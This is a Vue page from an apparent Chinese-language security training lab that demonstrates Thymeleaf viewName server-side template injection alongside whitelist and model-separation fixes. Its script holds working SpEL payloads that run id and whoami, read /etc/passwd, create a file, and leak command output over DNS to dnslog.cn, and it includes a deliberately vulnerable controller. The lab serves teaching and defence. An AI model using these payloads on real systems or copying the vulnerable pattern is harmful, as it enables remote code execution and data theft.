<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">SSTI 模板注入漏洞（Thymeleaf ViewName 注入）</div>
      <div class="body-div">
        <el-tabs v-model="activeName" @tab-click="handleClick">
          <el-tab-pane label="漏洞描述" name="first">
            <div class="vuln-detail">
              SSTI（Server-Side Template Injection，服务端模板注入）是指应用程序将不可信的用户输入嵌入到模板引擎可解析的位置，导致攻击者可以注入模板表达式或代码片段，进而被服务端模板引擎解析执行的漏洞。
              <br /><br />
              本实验使用 <strong>Thymeleaf 3.0.11.RELEASE</strong>，复现经典 <strong>viewName 注入型 SSTI</strong>。
              当 Controller 返回的视图名（模板路径）包含用户可控内容时，Thymeleaf 会解析 <code>__${...}__::fragment</code> Fragment Expression 语法，攻击者可借此执行 SpEL 表达式。
              <br /><br />
              <span style="color: red;">攻击原理：</span>
              <br />
              1. Controller 返回 <code>return "welcome/" + lang + "/welcome"</code>，用户输入直接拼入 viewName
              <br />
              2. 攻击者构造 <code>lang = __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x</code>
              <br />
              3. Thymeleaf 解析 viewName 时识别 <code>__${...}__</code> 为 Fragment Expression
              <br />
              4. 把 <code>${...}</code> 内部当作 SpEL 表达式求值，触发 Runtime.exec()
              <br />
              5. 表达式结果被当作模板名 → 找不到模板 → 报错信息中包含命令执行结果（<strong>报错回显</strong>）
              <br /><br />
              <span style="color: green;">版本说明：</span>Thymeleaf 3.0.12+ 引入了 <code>checkViewNameNotInRequest</code> 安全检查，阻止了此攻击向量。本实验固定使用 3.0.11 复现历史漏洞。
            </div>
          </el-tab-pane>
          <el-tab-pane label="漏洞危害" name="second">
            <div class="vuln-detail">
              SSTI 是模板引擎层面的高危漏洞，危害程度与 SpEL/OGNL 注入相当：
              <br /><br />
              <span style="color: red;">主要危害：</span>
              <br />
              • 远程代码执行（RCE）：通过 T() 语法访问 Runtime / ProcessBuilder，执行任意系统命令
              <br />
              • 任意文件读取：通过 java.nio.file.Files 读取 /etc/passwd 等敏感文件
              <br />
              • 任意文件写入：创建 webshell、计划任务、SSH 公钥
              <br />
              • 数据外带（OOB）：通过 curl / DNS 查询将敏感数据发送到攻击者控制的服务器
              <br />
              • 反弹 Shell：建立持久化 C2 通道
              <br />
              • 内网横向移动：以服务器为跳板攻击内网
              <br /><br />
              <span style="color: red;">真实案例：</span>
              <br />
              • CVE-2017-1763x 系列：Thymeleaf 各版本中的 Fragment Expression 解析问题
              <br />
              • CVE-2021-44228（Log4Shell 的近亲）：JNDI 注入虽然不属于 SSTI，但与 SpEL/JEXL/OGNL 同源
              <br />
              • Apache Struts2 OGNL 注入（S2-045 / S2-046）：本质是 OGNL 模板语法注入
            </div>
          </el-tab-pane>
          <el-tab-pane label="安全编码" name="third">
            <div class="vuln-detail">
              <span style="color: red;">【必须】禁止将用户输入拼接到 view 名（模板路径）</span>
              <br />
              这是 Thymeleaf viewName 注入的根因。无论使用何种模板引擎，模板名/模板路径都应当视为代码而非数据。
              <br /><br />
              <span style="color: red;">【必须】使用白名单严格限制可选项</span>
              <br />
              对 lang / theme / template 等参数，使用枚举或白名单 Set 校验，非法值一律 fallback 到默认值。
              <br /><br />
              <span style="color: red;">【必须】用户输入只通过 Model 传值</span>
              <br />
              用户输入应通过 <code>model.addAttribute()</code> 传到模板上下文，再用 <code>th:text</code> 安全输出（自动 HTML 转义）。view 名应硬编码或来自服务端定义。
              <br /><br />
              <span style="color: red;">【建议】升级 Thymeleaf 版本</span>
              <br />
              Thymeleaf 3.0.12+ 增加了 <code>checkViewNameNotInRequest</code> 检查，自动阻止 viewName 中包含来自请求参数的表达式。
              <br /><br />
              <span style="color: red;">【建议】最小权限运行</span>
              <br />
              即使被 SSTI/RCE 利用，应用进程也不应以 root 身份运行，需配合容器隔离、SELinux/AppArmor 等纵深防御。
            </div>
          </el-tab-pane>
          <el-tab-pane label="参考文章" name="fourth">
            <div class="vuln-detail">
              <a href="https://www.thymeleaf.org/doc/articles/standarddialect5minutes.html" target="_blank" style="text-decoration: underline;">《Thymeleaf 官方文档 - Standard Dialect》</a>：理解 Thymeleaf 表达式语法的官方入门。<br />
              <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/" target="_blank" style="text-decoration: underline;">《Exploiting SSTI in Thymeleaf》</a>：Acunetix 深度剖析 Thymeleaf SSTI 触发点。<br />
              <a href="https://portswigger.net/research/server-side-template-injection" target="_blank" style="text-decoration: underline;">《PortSwigger - Server-Side Template Injection》</a>：SSTI 漏洞的奠基性研究论文。<br />
              <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" style="text-decoration: underline;">《PayloadsAllTheThings - SSTI》</a>：覆盖多种模板引擎的 SSTI Payload 速查表。
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>

    <div class="code-demo">
      <!-- 第一行：漏洞代码 vs 安全代码1 -->
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              漏洞代码 - 用户输入直接控制 viewName
              <el-button type="danger" round size="mini" @click="showVulnDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * SSTI 漏洞版：用户输入直接拼入 Thymeleaf viewName
 * 在 Thymeleaf 3.0.11（3.0.12 之前）中，
 * __${...}__::fragment 语法会被作为 SpEL 表达式求值
 */
@GetMapping("/vuln")
public String vuln(@RequestParam(defaultValue = "zh") String lang, Model model) {
    model.addAttribute("lang", lang);
    // ❌ 关键漏洞点：用户输入直接控制 viewName
    return resolveVulnerableViewName(lang);
}

private String resolveVulnerableViewName(String lang) {
    if (ALLOWED_LANGS.contains(lang)) {
        return "welcome/" + lang + "/welcome";
    }
    return lang;  // ❌ 非白名单值直接返回
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              安全代码1 - 白名单校验 lang
              <el-button type="success" round size="mini" @click="showSecWhitelistDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * SSTI 安全版1：白名单校验
 * lang 必须在 {"zh", "en"} 之内，否则 fallback 到 zh
 * 任何包含 __${ 的恶意 payload 都不在白名单中，被静默丢弃
 */
private static final Set&lt;String&gt; ALLOWED_LANGS =
        new HashSet&lt;&gt;(Arrays.asList("zh", "en"));

@GetMapping("/sec/whitelist")
public String secWhitelist(@RequestParam(defaultValue = "zh") String lang, Model model) {
    if (!ALLOWED_LANGS.contains(lang)) {
        log.info("✅ 非法 lang={}, fallback 到 zh", lang);
        lang = "zh";    // ✅ 白名单兜底
    }
    model.addAttribute("lang", lang);
    return "welcome/" + lang + "/welcome";
}</code></pre>
          </div>
        </el-col>
      </el-row>

      <!-- 第二行：安全代码2（Model 分离）-->
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12"></el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              安全代码2 - 用户输入只走 Model，不进模板路径
              <el-button type="success" round size="mini" @click="showSecModelDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * SSTI 安全版2：view 名硬编码，lang 只通过 Model 传给模板
 * 即使 lang 含恶意 Fragment Expression，view 名始终是 welcome/default
 * 模板内用 th:text 输出会自动 HTML 转义，不会作为表达式执行
 */
@GetMapping("/sec/model")
public String secModel(@RequestParam(defaultValue = "zh") String lang, Model model) {
    log.info("✅ Model 分离：lang={}", lang);
    // ✅ 用户输入只放进 Model，view 名固定
    model.addAttribute("lang", lang);
    return "welcome/default";
}

// 对应模板 templates/welcome/default.html 中使用：
//   &lt;code th:text="${lang}"&gt;...&lt;/code&gt;
// th:text 会对内容做 HTML 实体转义，无 SSTI 风险</code></pre>
          </div>
        </el-col>
      </el-row>
    </div>

    <!-- ============ 漏洞测试对话框 ============ -->
    <el-dialog title="SSTI 漏洞测试（viewName 注入 + 报错回显 / OOB 外带）" :visible.sync="vulnDialogVisible" class="center-dialog" width="85%">
      <div style="text-align: left; color: red; font-style: italic;">
        <strong>攻击思路说明：</strong><br>
        1. <strong>探测阶段</strong> - 发送 <code>__${'ssti_test'}__::.x</code>，如果报错信息中出现 <code>ssti_test</code> 说明 SpEL 表达式被求值，SSTI 存在<br>
        2. <strong>报错回显</strong> - 命令执行结果被当作模板名 → Thymeleaf 找不到 → 报错信息中回显命令输出（依赖 <code>server.error.include-message: always</code>）<br>
        3. <strong>OOB 外带</strong> - 通过 DNSLog 将命令结果嵌入 DNS 子域名查询带出（需先到 <a href="http://dnslog.cn" target="_blank" style="color: blue;">dnslog.cn</a> 获取子域名，替换 payload 中的占位符）
      </div>
      <br />
      <el-form class="demo-form-inline">
        <el-form-item label="选择 Payload">
          <el-select v-model="vulnForm.selectedPayload" placeholder="请选择测试 Payload" @change="updateVulnLang" style="width: 100%;">
            <el-option label="✅ 正常请求 - lang=zh" value="zh"></el-option>
            <el-option label="✅ 正常请求 - lang=en" value="en"></el-option>
            <el-option label="🧪 探测 SSTI 是否存在" value="probe"></el-option>
            <el-option label="💀 报错回显 - 执行 id 命令" value="rce_id"></el-option>
            <el-option label="💀 报错回显 - 执行 whoami 命令" value="rce_whoami"></el-option>
            <el-option label="💀 报错回显 - 读取 /etc/passwd（前5行）" value="rce_passwd"></el-option>
            <el-option label="💀 盲注 RCE - 创建文件 /tmp/ssti_pwned" value="blind_touch"></el-option>
            <el-option label="📡 OOB 外带 - DNSLog 带出 whoami 结果" value="oob_dnslog"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="lang 参数">
          <el-input v-model="vulnForm.lang" type="textarea" :rows="4" placeholder="请输入 lang 参数（可包含 viewName SSTI payload）"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testVuln('vuln', 'vulnForm')">触发漏洞接口</el-button>
        </el-form-item>
      </el-form>
      <div v-if="vulnForm.requestUrl" class="result-display">
        <h4>服务端响应结果（iframe srcdoc 加载）：</h4>
        <div class="result-tip">
          🔗 请求 URL：<code style="word-break: break-all;">{{ vulnForm.requestUrl }}</code>
        </div>
        <iframe
          :srcdoc="vulnForm.html"
          class="ssti-iframe"
          sandbox="allow-same-origin allow-forms"></iframe>
      </div>
      <!-- OOB DNSLog 使用说明 -->
      <div class="oob-section">
        <el-divider content-position="left">📡 DNSLog OOB 外带使用说明</el-divider>
        <div style="text-align: left; font-size: 13px; color: #606266; line-height: 2;">
          1. 访问 <a href="http://dnslog.cn" target="_blank" style="color: #409EFF;">dnslog.cn</a>，点击 "Get SubDomain" 获取一个专属子域名（如 <code>abc123.dnslog.cn</code>）<br>
          2. 选择上方的 "📡 OOB 外带" payload，在文本框中将 <code>你的子域名.dnslog.cn</code> 替换为你获取的子域名<br>
          3. 点击 "触发漏洞接口"，页面会返回 500 报错（因为 Process 对象不是有效模板名），但命令已在服务端执行<br>
          4. 回到 dnslog.cn 页面，点击 "Refresh Record"，即可看到类似 <code>liujianping.abc123.dnslog.cn</code> 的 DNS 查询记录<br>
          5. 子域名前缀（如 <code>liujianping</code>）就是 <code>whoami</code> 命令的执行结果
        </div>
      </div>
    </el-dialog>

    <!-- ============ 安全1：白名单 测试对话框 ============ -->
    <el-dialog title="SSTI 安全测试（白名单校验）" :visible.sync="secWhitelistDialogVisible" class="center-dialog" width="80%">
      <div style="text-align: left; color: red; font-style: italic;">
        注意，安全版1 使用白名单 <code>{"zh", "en"}</code>：<br>
        - 任何非白名单值（包括 SSTI payload）都会被 fallback 到 <code>zh</code><br>
        - 你可以尝试同样的 payload，观察它们是否还能触发 SSTI
      </div>
      <br />
      <el-form class="demo-form-inline">
        <el-form-item label="选择 Payload">
          <el-select v-model="secWhitelistForm.selectedPayload" placeholder="请选择测试 Payload" @change="updateSecWhitelistLang" style="width: 100%;">
            <el-option label="✅ 正常请求 - lang=zh（白名单内）" value="zh"></el-option>
            <el-option label="✅ 正常请求 - lang=en（白名单内）" value="en"></el-option>
            <el-option label="🛡️ 非白名单 - lang=fr（会被 fallback 到 zh）" value="fr"></el-option>
            <el-option label="🛡️ SSTI 探测（会被白名单拦截）" value="probe"></el-option>
            <el-option label="🛡️ SSTI RCE - id 命令（会被白名单拦截）" value="rce_id"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="lang 参数">
          <el-input v-model="secWhitelistForm.lang" type="textarea" :rows="3" placeholder="请输入 lang 参数"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testVuln('sec/whitelist', 'secWhitelistForm')">触发安全接口</el-button>
        </el-form-item>
      </el-form>
      <div v-if="secWhitelistForm.requestUrl" class="result-display">
        <h4>服务端响应结果（iframe srcdoc 加载）：</h4>
        <div class="result-tip">
          🔗 请求 URL：<code style="word-break: break-all;">{{ secWhitelistForm.requestUrl }}</code>
        </div>
        <iframe
          :srcdoc="secWhitelistForm.html"
          class="ssti-iframe"
          sandbox="allow-same-origin allow-forms"></iframe>
      </div>
    </el-dialog>

    <!-- ============ 安全2：Model 分离 测试对话框 ============ -->
    <el-dialog title="SSTI 安全测试（用户输入只走 Model）" :visible.sync="secModelDialogVisible" class="center-dialog" width="80%">
      <div style="text-align: left; color: red; font-style: italic;">
        注意，安全版2 的 view 名始终是 <code>welcome/default</code>：<br>
        - 用户输入仅通过 <code>model.addAttribute("lang", lang)</code> 传递<br>
        - 模板内用 <code>th:text="${lang}"</code> 输出（自动 HTML 转义）<br>
        - 即使传入 SSTI payload，也不会被作为表达式解析
      </div>
      <br />
      <el-form class="demo-form-inline">
        <el-form-item label="选择 Payload">
          <el-select v-model="secModelForm.selectedPayload" placeholder="请选择测试 Payload" @change="updateSecModelLang" style="width: 100%;">
            <el-option label="✅ 正常 - lang=zh（原样显示）" value="zh"></el-option>
            <el-option label="✅ 正常 - lang=fr（任意值都安全显示）" value="fr"></el-option>
            <el-option label="🛡️ SSTI 探测（payload 会被原样显示，不执行）" value="probe"></el-option>
            <el-option label="🛡️ SSTI RCE - id 命令（payload 会被原样显示，不执行）" value="rce_id"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="lang 参数">
          <el-input v-model="secModelForm.lang" type="textarea" :rows="3" placeholder="请输入 lang 参数"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testVuln('sec/model', 'secModelForm')">触发安全接口</el-button>
        </el-form-item>
      </el-form>
      <div v-if="secModelForm.requestUrl" class="result-display">
        <h4>服务端响应结果（iframe srcdoc 加载）：</h4>
        <div class="result-tip">
          🔗 请求 URL：<code style="word-break: break-all;">{{ secModelForm.requestUrl }}</code>
        </div>
        <iframe
          :srcdoc="secModelForm.html"
          class="ssti-iframe"
          sandbox="allow-same-origin allow-forms"></iframe>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { buildSstiUrl, fetchSstiHtml } from '@/api/ssti'

const PAYLOADS = {
  zh: 'zh',
  en: 'en',
  fr: 'fr',
  probe: "__${'ssti_probe_success'}__::.x",
  rce_id: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','id'}).getInputStream()).useDelimiter('\\\\A').next()}__::.x`,
  rce_whoami: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','whoami'}).getInputStream()).useDelimiter('\\\\A').next()}__::.x`,
  rce_passwd: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','head -5 /etc/passwd | tr \"\\n\" \"|\"'}).getInputStream()).useDelimiter('\\\\A').next()}__::.x`,
  blind_touch: "__${T(java.lang.Runtime).getRuntime().exec('touch /tmp/ssti_pwned')}__::.x",
  oob_dnslog: `__\${T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','ping -c 1 $(whoami).你的子域名.dnslog.cn'})}__::.x`
}

const emptyForm = () => ({ selectedPayload: '', lang: '', requestUrl: '', html: '' })

export default {
  data() {
    return {
      activeName: 'first',
      vulnDialogVisible: false,
      secWhitelistDialogVisible: false,
      secModelDialogVisible: false,
      vulnForm: emptyForm(),
      secWhitelistForm: emptyForm(),
      secModelForm: emptyForm()
    }
  },
  methods: {
    handleClick(tab, event) {
      // noop
    },
    showVulnDialog() {
      this.vulnDialogVisible = true
      this.vulnForm = emptyForm()
    },
    showSecWhitelistDialog() {
      this.secWhitelistDialogVisible = true
      this.secWhitelistForm = emptyForm()
    },
    showSecModelDialog() {
      this.secModelDialogVisible = true
      this.secModelForm = emptyForm()
    },
    updateVulnLang() {
      this.vulnForm.lang = PAYLOADS[this.vulnForm.selectedPayload] || ''
    },
    updateSecWhitelistLang() {
      this.secWhitelistForm.lang = PAYLOADS[this.secWhitelistForm.selectedPayload] || ''
    },
    updateSecModelLang() {
      this.secModelForm.lang = PAYLOADS[this.secModelForm.selectedPayload] || ''
    },
    async testVuln(scene, formKey) {
      const form = this[formKey]
      if (!form.lang) {
        this.$message.warning('请输入 lang 参数')
        return
      }
      form.requestUrl = buildSstiUrl(scene, form.lang)
      try {
        const response = await fetchSstiHtml(scene, form.lang)
        form.html = await response.text()
      } catch (e) {
        form.html = `<pre style="color:#f56c6c;padding:20px;">请求失败：${e.message || e}</pre>`
      }
    }
  }
}
</script>

<style scoped>
.root-div {
  height: 100%;
}

.vuln-info {
  border-radius: 10px;
  margin-left: 20px;
  margin-right: 20px;
  margin-bottom: 20px;
  margin-top: 10px;
}

.header-div {
  font-size: 24px;
  color: #409EFF;
  font-weight: bold;
  padding: 10px;
  justify-content: center;
  align-items: center;
  border-bottom: 1px solid #ccc;
}

.body-div {
  padding: 10px;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;
  font-size: 14px;
}

.vuln-detail {
  background-color: #dce9f8;
  padding: 10px;
}

.code-demo {
  margin: 20px;
  border-top: 1px solid #ccc;
  padding-top: 20px;
}

pre code {
  font-size: 12px;
}

.el-row {
  margin-bottom: 20px;
}

.el-row:last-child {
  margin-bottom: 0;
}

.el-col {
  border-radius: 4px;
}

.bg-purple {
  background: #d3dce6;
}

.grid-content {
  border-radius: 4px;
  height: 100%;
  padding: 10px;
}

.grid-flex {
  display: flex;
  align-items: stretch;
}

.center-dialog {
  text-align: center;
  margin: 0 auto;
}

.demo-form-inline {
  text-align: left;
}

.result-display {
  margin-top: 20px;
  text-align: left;
}

.result-display h4 {
  margin-top: 0;
  margin-bottom: 10px;
  color: #303133;
  font-size: 16px;
  font-weight: bold;
}

.result-tip {
  background-color: #ecf5ff;
  border: 1px solid #b3d8ff;
  border-radius: 4px;
  padding: 8px 12px;
  margin-bottom: 10px;
  font-size: 13px;
  color: #303133;
}

.ssti-iframe {
  width: 100%;
  min-height: 320px;
  border: 1px solid #dcdfe6;
  border-radius: 4px;
  background-color: #f6f8fa;
}

.oob-section {
  margin-top: 20px;
  text-align: left;
}
</style>
